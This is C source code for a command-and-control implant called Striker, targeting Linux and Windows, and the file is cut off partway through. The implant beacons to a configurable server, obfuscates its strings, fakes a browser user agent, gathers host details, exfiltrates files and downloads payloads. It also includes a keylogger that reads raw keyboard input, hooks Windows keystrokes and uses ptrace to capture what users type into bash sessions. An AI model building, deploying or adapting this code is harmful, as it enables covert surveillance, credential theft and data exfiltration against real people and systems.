/**
 *----------------------------------------------------
 * The Striker C2 implant for linux and windows hosts.
 *                                  Author: Umar Abdul
 *----------------------------------------------------
 */

#include "striker.h"

/**
 * Uncomment the following macro to disable SSL verification.
 * Insecure, but required for using self-signed SSL certs.
 */
// #define INSECURE_SSL

// Uncomment the below macro to enable debug output
// #define STRIKER_DEBUG

// Size of agent UID
#define AGENT_UID_SIZE 17
// Max task result size in bytes
#define MAX_RES_SIZE (sizeof(char) * 102400)
// Max number of tasks to queue.
#define MAX_TASKS_QUEUE 100
// Max number of failed attempts to contact server before trying another server (if available)
#define MAX_CONTACT_FAILS 3
// Max number of keystrokes to collect by keymon
#define KEYMON_MAX_KEYSTROKES 50000
// Max number of processes to hook by keymon
#define KEYMON_MAX_PROCS 100
// Keymon's process refresh rate (in secs)
#define KEYMON_PROC_DELAY 1
// Max URL length allowed
#define URL_SIZE (sizeof(char) * 512)
// Max length for URL hostname, and path. Used for parsing.
#define MAX_URL_HOST_LEN 256
#define MAX_URL_PATH_LEN 512
// Reconnection delay for TCP bridge in secs
#define TCP_BRIDGE_RECONNECT_DELAY 5
// Max number of chars to read from clipboard (clipread)
#define MAX_CLIPBOARD_SIZE 1024000

#ifdef IS_WINDOWS
  // Max file upload size
  #define MAX_UPLOAD_SIZE (1024 * 100000)
  #ifdef INSECURE_SSL
    #define STRIKER_WININET_OPTIONS INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
  #else
    #define STRIKER_WININET_OPTIONS INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
  #endif
#endif

// Markers for the agent builder.
char BASE_URL[URL_SIZE] = "[STRIKER_URL]";
char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]";
char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";

// HTTP user agent
char STRIKER_USER_AGENT[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";  

// Some globals for the keylogger.
short keymon_active = 0;
#ifdef IS_WINDOWS
  static short *keymon_keystrokes = NULL;
  static size_t keymon_keystrokes_count = 0;
#else
  char KEYMON_DEFAULT_KBD[] = "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd";
#endif

char *obfs_decode(char *str){

  unsigned char key = (unsigned char)atoi(OBFS_KEY);
  size_t len = strlen(str);
  unsigned char curr_key;
  for (int i = 0; i < len; i++){
    curr_key = key * (i + 1);
    while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
      curr_key += 47;
    str[i] = str[i] ^ curr_key;
    key = curr_key;
  }
  return str;
}

char *random_str(size_t len){

  char *buff = malloc(len + 1);
  if (!buff)
    return NULL;
  srand(time(NULL));
  char table[] = "[OBFS_ENC]ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  obfs_decode(table);
  int table_len = strlen(table);
  for (int i = 0; i < len; i++)
    buff[i] = table[rand() % table_len];
  buff[len] = '\0';
  return buff;
}

void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
  
  char strs[][20] = {"[OBFS_ENC]http://", "[OBFS_ENC]https://"};
  for (int i = 0; i < 2; i++)
    obfs_decode(strs[i]);
  *proto = HTTP;
  if (!(strncmp(strs[0], url, 7))){
    *port = 80;
    url += 7;
  }else if (!(strncmp(strs[1], url, 8))){
    *proto = HTTPS;
    *port = 443;
    url += 8;
  }
  int host_len = 0;
  path[0] = '/';
  path[1] = '\0';
  for (int i = 0; i < strlen(url) && i < MAX_URL_HOST_LEN; i++){
    if (url[i] == '/'){
      strncpy(path, url + i, MAX_URL_PATH_LEN);
      break;
    }
    if (url[i] == ':'){
      *port = atoi(url + i + 1);
      while (i < strlen(url)){
        if (url[i] == '/'){
          strncpy(path, url + i, MAX_URL_PATH_LEN);
          break;
        }
        i++;
      }
      break;
    }
    host_len++;
  }
  strncpy(host, url, host_len);
  host[host_len] = '\0';
}

char *get_basename(char *path){
  
  int pos = -1;
  int path_len = strlen(path);
  for (int i = path_len - 1; i >= 0; i--){
    #ifdef IS_WINDOWS
      if (path[i] == '\\' || path[i] == '/'){
        pos = i;
        break;
      }
    #else
      if (path[i] == '/'){
        pos = i;
        break;
      }
    #endif
  }
  char *basename = NULL;
  if (pos == -1){ // Return the path as it was given
    basename = malloc(path_len + 1);
    strncpy(basename, path, path_len + 1);
  }else{ // Extract the basename.
    int basename_len = path_len - pos;
    basename = malloc(basename_len + 1);
    strncpy(basename, path + pos + 1, basename_len + 1);
  }
  return basename;
}

int http_get(char *url, buffer *body){

  char *target_url;
  if (url[0] == '/'){
    // Treat URL as relative path
    int url_len = strlen(BASE_URL) + strlen(url);
    target_url = malloc(url_len + 1);
    snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
  }else{
    target_url = malloc(strlen(url) + 1);
    strncpy(target_url, url, strlen(url) + 1);
  }
  #ifdef IS_LINUX
    CURL *curl = curl_easy_init();
    if (!curl){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error initializing curl!");
      #endif
      free(target_url);
      exit(EXIT_FAILURE);
    }
    #ifdef INSECURE_SSL
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    #endif
    curl_easy_setopt(curl, CURLOPT_URL, target_url);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
    CURLcode res = curl_easy_perform(curl);
    int rsp_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error making GET request to: %s: %s\n", target_url, curl_easy_strerror(res));
      #endif
      rsp_code = 0;
    }
    free(target_url);
    return rsp_code;
  #else
    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, STRIKER_WININET_OPTIONS, 0);
    if (!hResponse){
      #ifdef STRIKER_DEBUG
      printf("Error making GET request to %s: %ld\n", target_url, GetLastError());
      #endif
      InternetCloseHandle(hInternet);
      free(target_url);
      return 0;
    }
    free(target_url);
    DWORD dwStatusCode;
    DWORD dwHeaderSize = sizeof(DWORD);
    HttpQueryInfo(hResponse, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
    DWORD dwBlockSize = 1024;
    DWORD dwBytesRead;
    char *buff = malloc(dwBlockSize + 1);
    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
      if (!dwBytesRead)
        break;
      buff[dwBytesRead] = '\0';
      append_buffer(body, buff, strlen(buff));
    }
    free(buff);
    InternetCloseHandle(hResponse);
    InternetCloseHandle(hInternet);
    return dwStatusCode;
  #endif
}

int http_post(char *url, cJSON *data, buffer *body){

  char strs[][42] = {"[OBFS_ENC]Content-Type: application/json", "[OBFS_ENC]POST"};
  for (int i = 0; i < 2; i++)
    obfs_decode(strs[i]);
  char *target_url;
  if (url[0] == '/'){
    // Treat URL as relative path
    int url_len = strlen(BASE_URL) + strlen(url);
    target_url = malloc(url_len + 1);
    snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
  }else{
    target_url = malloc(strlen(url) + 1);
    strncpy(target_url, url, strlen(url) + 1);
  }
  #ifdef IS_LINUX
    CURL *curl = curl_easy_init();
    if (!curl){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error initializing curl!");
      #endif
      free(target_url);
      exit(EXIT_FAILURE);
    }
    char *post_body = cJSON_PrintUnformatted(data);
    struct curl_slist *post_headers = curl_slist_append(NULL, strs[0]);
    #ifdef INSECURE_SSL
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    #endif
    curl_easy_setopt(curl, CURLOPT_URL, target_url);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_body);
    CURLcode res = curl_easy_perform(curl);
    int rsp_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
    curl_easy_cleanup(curl);
    free(post_body);
    curl_slist_free_all(post_headers);
    if (res != CURLE_OK){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error making POST request to: %s: %s\n", target_url, curl_easy_strerror(res));
      #endif
      rsp_code = 0;
    }
    free(target_url);
    return rsp_code;
  #else
    DWORD dwStatusCode = 0;
    char *urlHost = malloc(MAX_URL_HOST_LEN);
    int urlPort;
    char *urlPath = malloc(MAX_URL_PATH_LEN);
    URL_PROTO urlProto;
    parse_url(target_url, &urlProto, urlHost, &urlPort, urlPath);
    char *postData = cJSON_PrintUnformatted(data);
    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest;
    if (urlProto == HTTPS)
      hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | STRIKER_WININET_OPTIONS, 0);
    else
      hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, STRIKER_WININET_OPTIONS, 0);      
    if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error making POST request to (%ld) : %s\n", GetLastError(), target_url);
      #endif
      goto end;
    }
    DWORD dwHeaderSize = sizeof(DWORD);
    HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
    DWORD dwBlockSize = 1024;
    DWORD dwBytesRead;
    char *buff = malloc(dwBlockSize + 1);
    while (InternetReadFile(hRequest, buff, dwBlockSize, &dwBytesRead)){
      if (!dwBytesRead)
        break;
      buff[dwBytesRead] = '\0';
      append_buffer(body, buff, strlen(buff));
    }
    free(buff);
    free(postData);
    free(urlPath);
    free(urlHost);
    end:
      InternetCloseHandle(hRequest);
      InternetCloseHandle(hConnect);
      InternetCloseHandle(hInternet);
      return dwStatusCode;
  #endif
}

#ifdef IS_LINUX

  size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

    size_t chunk_size = size * nmemb;
    append_buffer(buff, chunk, chunk_size);
    return chunk_size; // This tells curl that we received all bytes.
  }

  size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo){
    return fwrite(chunk, size, nmemb, wfo);
  }

#endif

int web_download(char *url, FILE *wfo){

  #ifdef IS_LINUX
    CURL *curl = curl_easy_init();
    if (!curl){
      return 1;
    }
    // We don't really need secure SSL for agent downloads (I think :)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return (res != CURLE_OK);
  #else
    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    // We don't really need secure SSL for agent downloads (I think :)
    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | STRIKER_WININET_OPTIONS, 0);
    if (!hResponse){
      InternetCloseHandle(hInternet);
      return 1;
    }
    DWORD dwBlockSize = 1024 * 50;
    DWORD dwBytesRead;
    char *buff = malloc(dwBlockSize);
    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
      if (!dwBytesRead)
        break;
      fwrite(buff, 1, dwBytesRead, wfo);
    }
    free(buff);
    InternetCloseHandle(hResponse);
    InternetCloseHandle(hInternet);
    return 0;
  #endif
}

cJSON *sysinfo(){

  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host", "[OBFS_ENC]windows", "[OBFS_ENC]USERNAME", "[OBFS_ENC]type"};
  for (int i = 0; i < 10; i++)
    obfs_decode(strs[i]);
  cJSON *info = cJSON_CreateObject();
  unsigned short pid = getpid();
  char *cwd = malloc(PATH_MAX);
  getcwd(cwd, PATH_MAX);
  cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
  cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
  cJSON_AddItemToObject(info, strs[9], cJSON_CreateNumber(0));
  #ifdef IS_LINUX
    char *host = malloc(100);
    char *user = getenv(strs[0]);
    gethostname(host, 99);
    cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
    cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[1]));
    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));
    free(host);
  #else
    char *user = getenv(strs[8]);
    DWORD size = 1024;
    LPSTR host = malloc(size);
    GetComputerNameExA(ComputerNameDnsFullyQualified, host, &size);
    cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
    cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[7]));
    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));    
    free(host);
  #endif
  free(cwd);
  return info;
}

short int upload_file(char *url, char *filename, size_t file_size, FILE *rfo, buffer *result_buff){

  char strs[][40] = {"[OBFS_ENC]File too large!", "[OBFS_ENC]file", "[OBFS_ENC]filename"};
  for (int i = 0; i < 3; i++)
    obfs_decode(strs[i]);
  #ifdef IS_LINUX
    buffer *body = create_buffer(0);
    CURL *curl = curl_easy_init();
    #ifdef INSECURE_SSL
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    #endif
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
    CURLcode res;
    curl_mime *form;
    curl_mimepart *field;
    form = curl_mime_init(curl);
    field = curl_mime_addpart(form);
    curl_mime_name(field, strs[1]);
    curl_mime_filedata(field, filename);
    field = curl_mime_addpart(form);
    curl_mime_name(field, strs[2]);
    curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    res = curl_easy_perform(curl);
    free_buffer(body);
    curl_mime_free(form);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      buffer_strcpy(result_buff, curl_easy_strerror(res));
      return 1;
    }
    char msg[] = "[OBFS_ENC]File downloaded successfully!";
    buffer_strcpy(result_buff, obfs_decode(msg));
    return 0;
  #else
    if (file_size > MAX_UPLOAD_SIZE){
      buffer_strcpy(result_buff, strs[0]);
      return 1;
    }
    char form_strs[][76] = {"[OBFS_ENC]----WebKitFormBoundary", "[OBFS_ENC]Content-Type: multipart/form-data; boundary=", "[OBFS_ENC]\r\nContent-Length: ", "[OBFS_ENC]\r\nContent-Disposition: form-data; name=\"file\"; filename=\"", "[OBFS_ENC]\"\r\nContent-Type: application/octet-stream\r\n\r\n"};
    for (int i = 0; i < 5; i++)
      obfs_decode(form_strs[i]);
    char *token = random_str(16);
    char *boundary = malloc(50);
    strncpy(boundary, form_strs[0], 50);
    strncat(boundary, token, 50 - strlen(boundary));
    char *headers = malloc(1024);
    strncpy(headers, form_strs[1], 1024);
    strncat(headers, boundary, 1024 - strlen(headers));
    strncat(headers, form_strs[2], 1024 - strlen(headers));

    URL_PROTO proto;
    char *urlHost = malloc(MAX_URL_HOST_LEN);
    int urlPort = 0;
    char *urlPath = malloc(MAX_URL_PATH_LEN);
    parse_url(url, &proto, urlHost, &urlPort, urlPath);
    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest;
    if (proto == HTTPS)
      hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | STRIKER_WININET_OPTIONS, 0);
    else
      hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, STRIKER_WININET_OPTIONS, 0);

    char *formDataPrefix = malloc(1024);
    strncpy(formDataPrefix, "--", 1024);
    strncat(formDataPrefix, boundary, 1024 - strlen(formDataPrefix));
    strncat(formDataPrefix, form_strs[3], 1024 - strlen(formDataPrefix));
    char *basename = get_basename(filename);
    strncat(formDataPrefix, basename, 1024 - strlen(formDataPrefix));
    strncat(formDataPrefix, form_strs[4], 1024 - strlen(formDataPrefix));

    char *formDataSuffix = malloc(100);
    strncpy(formDataSuffix, "\r\n--", 100);
    strncat(formDataSuffix, boundary, 100 - strlen(formDataSuffix));
    strncat(formDataSuffix, "--\r\n", 100 - strlen(formDataSuffix));

    size_t bodySize = strlen(formDataPrefix) + file_size + strlen(formDataSuffix);
    char *bodySizeStr = malloc(32);
    snprintf(bodySizeStr, 32, "%ld", (unsigned long)bodySize);
    strncat(headers, bodySizeStr, 1024 - strlen(headers));

    char *requestBody = malloc(bodySize);
    memcpy(requestBody, formDataPrefix, strlen(formDataPrefix));
    fread(requestBody + strlen(formDataPrefix), 1, file_size, rfo);
    memcpy(requestBody + strlen(formDataPrefix) + file_size, formDataSuffix, strlen(formDataSuffix));

    int res = 0;
    if (!HttpSendRequest(hRequest, headers, strlen(headers), requestBody, bodySize))
      res = 1;
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(urlHost); free(urlPath); free(token); free(basename);
    free(boundary); free(headers); free(formDataPrefix);
    free(formDataSuffix); free(bodySizeStr); free(requestBody);
    char msg[] = "[OBFS_ENC]File downloaded successfully!";
    buffer_strcpy(result_buff, obfs_decode(msg));
    return res;
  #endif
}

void keymon(session *striker, task *tsk){

  keymon_active = 1;
  cJSON *data = tsk->data;
  #ifdef IS_LINUX
    char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful", "[OBFS_ENC]main-kbd"};
    for (int i = 0; i < 7; i++)
      obfs_decode(strs[i]);
    buffer *result_buff = create_buffer(0);
    unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    unsigned char *keys = malloc(sizeof(unsigned char) * KEYMON_MAX_KEYSTROKES);
    size_t count = 0;
    unsigned char main_kb_attached = 1;
    int kb = open(striker->kbd_event_file, O_RDONLY);
    if (kb == -1){
      buffer_strcpy(result_buff, strs[2]);
      main_kb_attached = 0;
    }
    fd_set set;
    struct timeval timeout = {1, 0};
    struct input_event e;
    time_t end_time = time(NULL) + duration;
    
    queue *km_proc_dumps = queue_init(KEYMON_MAX_PROCS);
    queue *km_proc_arg = queue_init(4);
    queue_put(km_proc_arg, striker);
    queue_put(km_proc_arg, tsk);
    queue_put(km_proc_arg, &end_time);
    queue_put(km_proc_arg, km_proc_dumps);
    pthread_t tid ;
    pthread_create(&tid, NULL, keymon_proc_watch, km_proc_arg);
    
    if (main_kb_attached){  
      while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time && tsk->abort == 0){
        timeout.tv_sec = 1;
        FD_ZERO(&set);
        FD_SET(kb, &set);
        int status = select(kb + 1, &set, NULL, NULL, &timeout);
        if (status == -1)
          break;
        if (!status)
          continue;
        read(kb, &e, sizeof(e));
        if (!(e.type == EV_KEY && e.value == 0))
          continue;
        keys[count] = e.code;
        count++;
      }
      close(kb);
    }
    pthread_join(tid, NULL);

    queue_seek(km_proc_dumps, 0);
    while (!queue_exhausted(km_proc_dumps)){
      queue *km_result = queue_get(km_proc_dumps);
      queue_seek(km_result, 2);
      pid_t *pid = queue_get(km_result);
      cJSON *proc_keys = cJSON_CreateArray();
      while (!queue_exhausted(km_result)){
        unsigned char *key = queue_get(km_result);
        cJSON_AddItemToArray(proc_keys, cJSON_CreateNumber(*key));
        free(key);
      }
      char pid_str[8];
      snprintf(pid_str, 8, "%d", *pid);
      cJSON_AddItemToObject(tsk->result, pid_str, proc_keys);
      queue_free(km_result, 0);
      free(pid);
    }
    queue_free(km_proc_dumps, 0);
    queue_free(km_proc_arg, 0);
    
    cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(tsk->uid));
    if (count > 0){
      cJSON *main_kb_keys = cJSON_CreateArray();
      for (int i = 0; i < count; i++)
        cJSON_AddItemToArray(main_kb_keys, cJSON_CreateNumber(keys[i]));
      cJSON_AddItemToObject(tsk->result, strs[6], main_kb_keys);
      tsk->successful = 1;
    }else{
      char *res = buffer_to_string(result_buff);
      cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(res));
    }
    cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateNumber(tsk->successful));
    free(keys);
    free_buffer(result_buff);
  #else
    char strs[][40] = {"[OBFS_ENC]duration", "[OBFS_ENC]Error creating hook thread!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]No keys logged!", "[OBFS_ENC]main-kbd"};
    for (int i = 0; i < 6; i++)
      obfs_decode(strs[i]);
    unsigned long duration = (unsigned long)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    time_t end_time = time(NULL) + duration;
    keymon_keystrokes = malloc(sizeof(short) * KEYMON_MAX_KEYSTROKES);
    DWORD threadID;
    HANDLE tHandle = CreateThread(NULL, 0, keymon_create_hook, NULL, 0, &threadID);
    cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateString(tsk->uid));
    if (!tHandle){
      cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(strs[1]));
    }else{
      while (!(striker->abort || tsk->abort || keymon_keystrokes_count >= KEYMON_MAX_KEYSTROKES || time(NULL) >= end_time))
        sleep(1);
      #ifdef STRIKER_DEBUG
      printf("[*] keymon: killing keyboard hook...\n");
      #endif
      TerminateThread(tHandle, 0);
      sleep(1);
      if (keymon_keystrokes_count > 0){      
        cJSON *keysArray = cJSON_CreateArray();
        for (int i = 0; i < keymon_keystrokes_count; i++)
          cJSON_AddItemToArray(keysArray, cJSON_CreateNumber(*(keymon_keystrokes + (sizeof(short) * i))));
        cJSON_AddItemToObject(tsk->result, strs[5], keysArray);
      }else{
        cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(strs[4]));
      }
    }
    free(keymon_keystrokes);
    keymon_keystrokes = NULL;
    keymon_keystrokes_count = 0;
  #endif
  tsk->completed = 1;
  keymon_active = 0;
}

#ifdef IS_LINUX
  void *keymon_proc_watch(void *ptr){

    char strs[][40] = {"[OBFS_ENC]/proc", "[OBFS_ENC]/proc/%d/cmdline"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char targets[][30] = {"[OBFS_ENC]-bash", "[OBFS_ENC]bash" , "[OBFS_ENC]/bin/bash", "[OBFS_ENC]/usr/bin/bash"};
    int targets_len = sizeof(targets) / 50;
    for (int i = 0; i < targets_len; i++)
      obfs_decode(targets[i]);
    queue *q = (queue *)ptr;
    session *striker = queue_get(q);
    task *tsk = queue_get(q);
    time_t *end_time = queue_get(q);
    queue *results_queue = queue_get(q);
    pthread_t tids[KEYMON_MAX_PROCS];
    pid_t pids[KEYMON_MAX_PROCS];
    size_t attached_count = 0;
    while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time && tsk->abort == 0){
      struct dirent *dir;
      DIR *d = opendir(strs[0]);
      if (!d)
        break;
      while ((dir = readdir(d)) != NULL && attached_count < KEYMON_MAX_PROCS){
        if (dir->d_type == DT_DIR){
          pid_t *pid = malloc(sizeof(pid_t));
          *pid = atoi(dir->d_name);
          if (*pid == 0){
            free(pid);
            continue;
          }
          unsigned char watched = 0;
          for (int i = 0; i < attached_count; i++){
            if (pids[i] == *pid){
              watched = 1;
              break;
            }
          }
          if (watched){
            free(pid);
            continue;
          }
          // /proc/<pid>/cmdline file separates executable and args with null bytes, so we need this form of matching to seperate shell sessions from script invocations like: /bin/bash script.sh
          char *filename = malloc(50);
          memset(filename, 0, 50);
          snprintf(filename, 50, strs[1], *pid);
          int fd = open(filename, O_RDONLY);
          if (fd == -1){
            free(filename); free(pid);
            continue;
          }
          char *proc_name = malloc(50);
          memset(proc_name, 0, 50);
          int n = read(fd, proc_name, 50);
          if (n == 0 || n == -1){
            close(fd); free(filename); free(proc_name); free(pid);
            continue;
          }
          char *buff = malloc(50);
          int valid = 0;
          for (int i = 0; i < targets_len; i++){
            memset(buff, 0, 50);
            strncpy(buff, targets[i], strlen(targets[i]));
            if (!memcmp(buff, proc_name, 50)){
              valid = 1;
              break;
            }
          }
          close(fd); free(filename); free(proc_name); free(buff);
          if (!valid){
            free(pid);
            continue;
          }
          queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 4);
          queue_put(data, striker);
          queue_put(data, tsk);
          queue_put(data, end_time);
          queue_put(data, pid);
          queue_put(results_queue, data);
          pthread_create(tids + attached_count, NULL, keymon_proc_attach, data);
          pids[attached_count] = *pid;
          attached_count++;
        }
      }
      closedir(d);
      sleep(KEYMON_PROC_DELAY);
    }
    for (int i = 0; i < attached_count; i++)
      pthread_join(tids[i], NULL);
    pthread_exit(NULL);
  }

  void *keymon_proc_attach(void *ptr){

    queue *q = (queue *)ptr;
    session *striker = queue_get(q);
    task *tsk = queue_get(q);
    time_t *end_time = queue_get(q);
    pid_t *pid = queue_get(q);
    struct user_regs_struct regs;
    if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
      pthread_exit(NULL);
    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
    while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time && tsk->abort == 0){
      ptrace(PTRACE_SYSCALL, *pid, 0, 0);
      int status = -47;
      while (status == -47){
        waitpid(*pid, &status, WNOHANG);
        usleep(1000);
        if (striker->abort || tsk->abort || time(NULL) >= *end_time)
          goto complete;
      }
      if (WIFEXITED(status))
        break;
      ptrace(PTRACE_GETREGS, *pid, 0, &regs);
      #ifdef __x86_64__
      if (regs.orig_rax == 0 && regs.rdi == 0){
        unsigned char *val = malloc(sizeof(unsigned char));
        *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.rsi, 0);
        if (*val != 0)
          queue_put(q, val);
        else
          free(val);
      }
      #else
      if (regs.orig_eax == 0 && regs.edi == 0){
        unsigned char *val = malloc(sizeof(unsigned char));
        *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.esi, 0);
        if (*val != 0)
          queue_put(q, val);
        else
          free(val);
      }      
      #endif
    }
    complete:
      ptrace(PTRACE_DETACH, *pid, NULL, NULL);
      pthread_exit(NULL);
  }
#else
  DWORD WINAPI keymon_create_hook(LPVOID ptr){

    //Retrieve the applications instance
    HINSTANCE hInstance = GetModuleHandle(NULL);
    //Set a global Windows Hook to capture keystrokes using the function declared above
    HHOOK kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, keymon_hook_proc, hInstance, 0);
    if (!kbHook){
      #ifdef STRIKER_DEBUG
      printf("[-] keymon: unable to hook keyboard!\n");
      #endif
      return 0;
    }
    #ifdef STRIKER_DEBUG
    printf("[+] keymon: keyboard hooked!\n");
    #endif
    MSG Msg;
    while (GetMessage(&Msg, NULL, 0, 0) > 0){
      TranslateMessage(&Msg);
      DispatchMessage(&Msg);
    }
    return 0;
  }

  LRESULT CALLBACK keymon_hook_proc(int nCode, WPARAM wParam, LPARAM lParam){

    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    DWORD pressedKey = pKeyBoard->vkCode;
    short isKeyup = wParam == WM_KEYUP;
    if ((!isKeyup) || pressedKey == VK_RSHIFT || pressedKey == VK_LSHIFT || pressedKey == VK_SHIFT || pressedKey == VK_CAPITAL){
      return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    short result = (short)pressedKey;
    if (GetKeyState(VK_CAPITAL) & 0x1) // Caps lock key is toggled?
